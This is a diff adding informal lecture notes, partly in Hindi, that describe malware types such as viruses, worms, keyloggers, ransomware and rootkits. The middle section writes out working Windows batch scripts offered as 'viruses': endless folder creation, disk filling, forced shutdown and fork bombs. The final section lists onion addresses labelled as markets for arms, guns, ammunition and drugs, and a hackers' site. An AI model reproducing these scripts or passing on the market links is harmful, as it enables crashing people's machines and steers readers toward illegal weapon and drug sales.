@@ -1,0 +1,140 @@
+					Lecture 5 
+
+Malware : Malicious + Software
+
+          Software tht is intended to harm
+ A software that disrupt or alter the normal operation of an electronic device.Electronic device could be anything either mobile phone or computers, tablets etc...
+
+ How it basically works: It infects a device or machine by tricking users nto clicking or installing a program .
+ EFFECTS OF MALWARES
+-> Replicate themselves
+-> Keep your key strokes
+-> Might eat up your whole memory space
+
+ How we get ourself into installing a Malware :
+ -----------------------------------------------
+ For the installation of malwares there are some techniques or we can say bait provided by hackers to make you click on such document or on a link or installing an executable software.
+
+
+Types of Malwares:
+	Virus , Worms , Keyloggers , Ransomewares , Spywares (Trojans , Adwares ) , Rootkits (ROOT + KIT) , Botnet
+	roBOT in a NETwork
+
+VIRUS (Vital Information Resource Under Siege):
+A piece of code which is capable of copying itself and typically has a devastating effect and it also require a human being for its implementation.
+Viruses spread by reproducing and inserting themselves into programs, documents, or e-mail attachments.And they won't work untill unless we don't strike them or lead them to the phase of execution.
+EG: Tera bit virus maker
+FUD : FUlly Undetectable
+
+
+
+Chota packet nyaa dhanamka...
+  
+  -->infinite folder: 
+          :loop
+          mkdir %random%
+          goto loop
+
+  --> Space consuming Virus:
+   		:loop
+   		mkdir hello
+   		cd hello
+   		echo " main saari jgh ko khtm kr dunga">> file.txt
+   	    goto loop     
+
+   -->Shutdown Virus:
+         shutdown -s -t 10 -c "ahem ahem"
+
+   -->fork bomb :
+   			%0|%0
+
+    --> Process Calling:
+       :label
+       start cmd.exe
+       goto label 
+
+
+-->megafork bomb 
+       :loop
+       mkdir fork
+       cd fork
+       echo "%0|%0">>forkbomb.bat
+       start forkbomb.bat
+       goto loop
+  
+
+
+Types of ViRUSES
+: Browser Hijacker (jo aapko aapki sites pr multiple sites pr visit kraane ke baad pahuchaye):The virus which will redirect yoy to your website  by browsing through several other websites.
+
+->File Infector ( jo file ke saath chipak jaye r fr infect krta jaaye uske execution pr): This virus will simple attach itself with a normal file and will start effecting its content or execution.
+
+->Polymorphic Virus (They are encrypted    and change operations over time).
+
+->Macro(ek bde instruction ko chote sub instruction me baat deta hai) Virus
+  Boot Sector Virus
+  Memory Resident Virus (adiyal hota hai host program chla bhi jaaye tbhi bhi execute hota rehta hai)
+  etc etc ...
+
+Worms:
+A computer worm is self-replicating malware that duplicates itself to spread to uninfected computers. Worms often use parts of an operating system that are automatic and invisible to the user. It is common for worms to be noticed only when their uncontrolled replication consumes system resources, slowing or halting other tasks.
+
+
+
+Stuxnet : https://www.youtube.com/watch?v=7g0pi4J8auQ
+
+
+Keyloggers
+Recording your keystrokes that is whatever you type will be stored in a log file
+			Local Storage 
+			Remote Storage
+Eg: Ardamax Keylogger, Hooker.
+
+Ransomwares :
+ These are the malwares which basically encrypt all your files and at the end they just ask you to pay the ransom to get the decryting key like recent ransomewares are Wannacry , Petya.
+
+
+Trojan:
+ A type of Malware which at first seems to be a usefull stuff but at the backend it is harming in a way like stealing your data or either corrupting them up etc.
+
+Adwares:
+Adware is designed to display advertisements on your computer and redirect your search requests to advertising websites to collect marketing data about you.
+
+
+ Spyware :
+ Spyware is malicious computer program that does exactly what its name implies-i.e., spies on you.Some spyware programs contain keyloggers that will record personal data you enter in to websites, such as your login usernames and passwords, email addresses, browsing history, online buying habits, your computer's hardware and software configurations, your name, age and sex, as well as sensitive banking and credit information. 
+
+
+
+ Rootkits :
+ rootkit is basically a software kit used to get to the root of the computer. In other words, a software kit used to gain admin access to the computer and thereby control it. Developed as a legitimate software to provide a ‘backdoor’ to software developers.
+
+
+
+Dark web links 
+
+https://www.deepweb-sites.com/deep-web-links-2015/4/
+
+https://www.deepweb-sites.com/deep-web-links/
+
+https://darkwebnews.com/deep-web-links/
+
+
+
+
+google for dark web ----> http://grams7enufi7jmdl.onion/
+
+http://valhallaxmn3fydu.onion/products/4355 --->arms and drugs 
+http://valhallaxmn3fydu.onion/products/55065 --->gun product view
+http://valhallaxmn3fydu.onion/products/61212
+
+http://tuu66yxvrnn3of7l.onion/ --->ammo store
+
+
+http://hansamkt2rr6nfg3.onion/category/1/ --->Drugs 
+
+http://newpdsuslmzqazvr.onion/ ----> drug store 
+
+http://hackerw6dcplg3ej.onion/ ---->hackers place
+abbujjh5vqtq77wg.onion
+
